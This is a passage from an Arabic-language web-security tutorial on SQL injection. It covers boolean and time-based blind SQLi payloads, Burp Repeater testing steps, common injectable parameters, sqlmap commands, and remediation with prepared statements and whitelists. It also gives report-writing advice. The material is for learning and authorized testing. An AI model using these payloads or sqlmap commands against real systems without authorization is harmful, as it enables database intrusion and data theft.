| `10 AND IF(1=1,SLEEP(5),0)` | time-based مع شرط true |
| `10 AND IF(1=2,SLEEP(5),0)` | time-based مع شرط false |
| `10 AND SUBSTRING(DATABASE(),1,1)='a'` | سؤال true/false عن أول حرف من اسم database داخل lab |
| `10 AND IF(SUBSTRING(DATABASE(),1,1)='a',SLEEP(5),0)` | سؤال time-based عن أول حرف من اسم database داخل lab |

كيف تختار payload؟

- لو التطبيق يستخدم MySQL قد ترى `#` أو `-- `.
- لو فيه أقواس حول الشرط قد تحتاج تغلق القوس.
- لو input داخل quote، تحتاج تفهم هل quote مفردة `'` أو مزدوجة `"`.
- لو التطبيق يستخدم prepared statements، هذه payloads ستتعامل كنص عادي ولن تغير query.
- في blind SQLi لا تعتمد على مرة واحدة. كرر true/false بهدوء للتأكد من أن الفرق ثابت.

علامات أن payload أثرت:

- login success بدون password صحيح.
- تغير واضح في response length.
- تغير status code أو redirect.
- ظهور database error.
- ظهور بيانات أكثر من المتوقع.
- تأخر response بوضوح مع time-based payload.

## 10. كيف تختبر بشكل آمن؟

اختبار SQL issues يكون بهدوء وداخل scope فقط.

خطوات عامة:

```text
1. افتح request في Burp Proxy.
2. أرسله إلى Repeater.
3. عدل parameter واحد فقط.
4. قارن response قبل وبعد.
5. ابحث عن اختلاف واضح في status, length, error, redirect, أو login state.
6. وثق النتيجة بدون ضغط على السيرفر.
```

أمثلة parameters تستحق المراجعة:

| المكان | مثال |
|---|---|
| Login | username, email, password |
| Search | q, search, keyword |
| Profile | id, user_id |
| Product | product_id, category |
| API | JSON fields داخل request body |

### Checklist أثناء الاختبار في Burp

استخدم Repeater أكثر من Intruder في البداية حتى تفهم السلوك بدون إرسال requests كثيرة.

```text
1. خذ baseline request طبيعي.
2. احفظ status code و response length و أهم كلمة في response.
3. عدل parameter واحد فقط.
4. جرّب true/false بسيط داخل lab أو scope مصرح.
5. كرر نفس المقارنة أكثر من مرة لو النتيجة غير واضحة.
6. راقب هل يوجد caching أو redirect يغير النتيجة.
7. لا تستخرج بيانات كثيرة لإثبات الثغرة.
```

جدول مقارنة بسيط أثناء التحليل:

| الطلب | المتوقع | ماذا تلاحظ؟ |
|---|---|---|
| Normal value | baseline | صفحة طبيعية |
| True condition | قريب من baseline | نفس المحتوى أو نفس login state |
| False condition | مختلف | محتوى أقل، 404، redirect، أو JSON مختلف |
| Time delay | تأخير واضح | فرق ثابت وليس بسبب الشبكة |

### أماكن SQLi الشائعة

لا تختبر login فقط. SQL قد تظهر في أي مكان يستخدم database.

| المكان | Parameters شائعة |
|---|---|
| Login | `email`, `username`, `password` |
| Search | `q`, `query`, `search`, `keyword` |
| Filters | `category`, `type`, `status`, `date` |
| Sorting | `sort`, `order`, `direction`, `column` |
| Pagination | `page`, `limit`, `offset` |
| Object pages | `id`, `product_id`, `post_id`, `user_id` |
| API JSON | أي field داخل body |
| Cookies | tracking IDs أو preferences |
| Headers | أقل شيوعا، لكن أحيانا تدخل في logging أو analytics |

### SQLi في JSON APIs

في APIs الحديثة، input قد يكون داخل JSON وليس query string.

مثال request:

```http
POST /api/products/search HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "keyword": "phone",
  "sort": "price"
}
```

لو backend يبني query بشكل غير آمن من `keyword` أو `sort`، قد تظهر SQL Injection.

نقطة مهمة:

```text
القيم النصية مثل keyword تصلح معها prepared statements
لكن أسماء columns مثل sort تحتاج whitelist
```

مثال whitelist آمن:

```js
const allowedSort = {
  price: "price",
  newest: "created_at",
  name: "name"
};

const sortColumn = allowedSort[req.body.sort] || "created_at";
```

### SQLi في ORDER BY

`ORDER BY` حالة خاصة لأن اسم العمود لا يمكن غالبا تمريره كـ parameter عادي.

مثال غير آمن:

```js
const query = "SELECT * FROM products ORDER BY " + req.query.sort;
```

لو المستخدم يتحكم في `sort` مباشرة، قد يغير شكل query.

الإصلاح يكون بـ whitelist:

```text
sort=price  -> ORDER BY price
sort=name   -> ORDER BY name
غير ذلك     -> ORDER BY created_at
```

لا تجعل المستخدم يرسل اسم column الحقيقي مباشرة إلا لو سيتم التحقق منه من قائمة محددة.

### استخدام sqlmap بحذر

`sqlmap` أداة قوية لاختبار SQL Injection، لكنها قد ترسل requests كثيرة وتستخرج بيانات كثيرة إذا استخدمت بدون ضبط.

استخدمها فقط:

- داخل lab.
- أو داخل برنامج يسمح بها بوضوح.
- وبـ rate مناسب.
- وبعد فهم request يدويا في Burp.

أمر تعليمي داخل lab:

```bash
sqlmap -u "https://example.com/product?id=5" --batch
```

لو request يحتاج cookies أو POST body، الأفضل تصدر request من Burp إلى ملف ثم تستخدمه داخل lab:

```bash
sqlmap -r request.txt --batch
```

> [!warning] مهم
> لا تجعل sqlmap يستخرج database كاملة لإثبات finding. في bug bounty غالبا يكفي دليل محدود يثبت التحكم في query مع impact واضح.

## 11. كيف يكون الإصلاح؟

أفضل دفاع ضد SQL Injection هو استخدام parameterized queries أو prepared statements.

مثال غير آمن:

```text
"SELECT * FROM users WHERE email = '" + email + "'"
```

مثال آمن كفكرة:

```text
SELECT * FROM users WHERE email = ?
```

مع تمرير `email` كقيمة منفصلة، وليس جزءا من نص query.

إجراءات حماية مهمة:

- استخدام prepared statements.
- عدم لصق user input داخل SQL.
- استخدام password hashing مثل bcrypt أو Argon2.
- جعل رسالة login عامة: `Invalid email or password`.
- إضافة rate limiting على login و forgot password.
- تسجيل المحاولات المشبوهة في logs.
- عدم عرض database errors للمستخدم.
- استخدام أقل صلاحيات ممكنة لحساب قاعدة البيانات.

### Least Privilege لحساب قاعدة البيانات

حتى لو حدث SQL Injection، تقليل صلاحيات database user يقلل الضرر.

أمثلة:

| الحساب | الصلاحيات المناسبة |
|---|---|
| app_readonly | `SELECT` فقط للصفحات التي تقرأ بيانات |
| app_writer | `SELECT`, `INSERT`, `UPDATE` للجداول المطلوبة فقط |
| migration_user | صلاحيات schema migrations، ولا يستخدمه التطبيق اليومي |

أخطاء خطيرة:

- التطبيق يتصل بقاعدة البيانات بحساب root/admin.
- نفس الحساب يقرأ كل databases.
- الحساب يستطيع `DROP`, `ALTER`, أو قراءة ملفات من السيرفر.
- production و staging يستخدمان نفس credentials.

### حماية passwords

لا تخزن password كنص واضح، ولا تبحث عنه مباشرة في SQL.

خطأ:

```sql
SELECT *
FROM users
WHERE email = 'sara@example.com'
AND password = '123456';
```

الأفضل:

```text
1. ابحث عن user بالـ email.
2. اجلب password_hash.
3. قارن password باستخدام bcrypt أو Argon2.
4. لا تكشف هل email موجود أم لا.
```

مثال شكل data أفضل:

| id | email | password_hash |
|---|---|---|
| 2 | test@example.com | `$2b$12$...` |

> [!summary] قاعدة مهمة
> SQL يحضر المستخدم، لكن التحقق من password يكون بمقارنة آمنة مع hash داخل backend.

## مثال Report مختصر

```text
Title: SQL Injection allows authentication bypass

Description:
The login endpoint appears to concatenate user input into a SQL query.
By modifying the username parameter in an authorized test, the application
accepted the request and created an authenticated session without a valid password.

Impact:
An attacker may access accounts without knowing valid credentials.

Recommendation:
Use parameterized queries/prepared statements, generic login errors,
rate limiting, and secure password verification.
```

## ماذا توثق في Report؟

التوثيق الجيد يثبت المشكلة بدون كشف بيانات أكثر من اللازم.

اكتب:

- endpoint المتأثر.
- parameter المتأثر.
- request طبيعي و request معدل.
- الفرق في response.
- نوع SQLi إذا كان واضحا: error-based, union-based, boolean-based, time-based.
- impact واضح ومحدود.
- recommendation عملية.

لا تكتب:

- dump كامل لقاعدة البيانات.
- passwords أو tokens حقيقية.
- بيانات مستخدمين لا تحتاجها لإثبات الثغرة.
- خطوات تسبب ضغط كبير على السيرفر.

مثال impact أقوى من مجرد "SQL Injection exists":

```text
The vulnerable id parameter allows reading data from other tables,
which may expose user emails and account metadata.
```

مثال recommendation واضح:

```text
Replace string concatenation with prepared statements,
validate numeric IDs server-side,
use a whitelist for ORDER BY values,
and remove database error details from user responses.
```

## أوامر SQL الأساسية

| الأمر | الاستخدام |
|---|---|
| SELECT | قراءة بيانات |
| INSERT | إضافة بيانات |
| UPDATE | تعديل بيانات |
| DELETE | حذف بيانات |
| WHERE | إضافة شرط |
| AND / OR | دمج أكثر من شرط |
| LIKE | البحث داخل النص |
| ORDER BY | ترتيب النتائج |
| LIMIT | تحديد عدد النتائج |
| JOIN | ربط أكثر من table |
| COUNT | حساب عدد rows |
| GROUP BY | تجميع النتائج |
| BEGIN / COMMIT / ROLLBACK | تنفيذ transaction أو إلغاؤها |

## الخلاصة

> [!summary] SQL ببساطة
> SQL هي لغة التعامل مع قواعد البيانات. أهم أوامر البداية هي SELECT للقراءة، INSERT للإضافة، UPDATE للتعديل، و DELETE للحذف، ثم تأتي مفاهيم مثل JOIN, GROUP BY, constraints, و transactions لفهم التطبيقات الواقعية. في اختبار تطبيقات الويب، فهم SQL يساعدك تفهم كيف يتعامل التطبيق مع البيانات، ولماذا يجب حماية queries من الأخطاء والثغرات مثل SQL Injection, UNION Based SQL Injection, Blind SQL Injection, Username Enumeration, و Authentication Bypass.
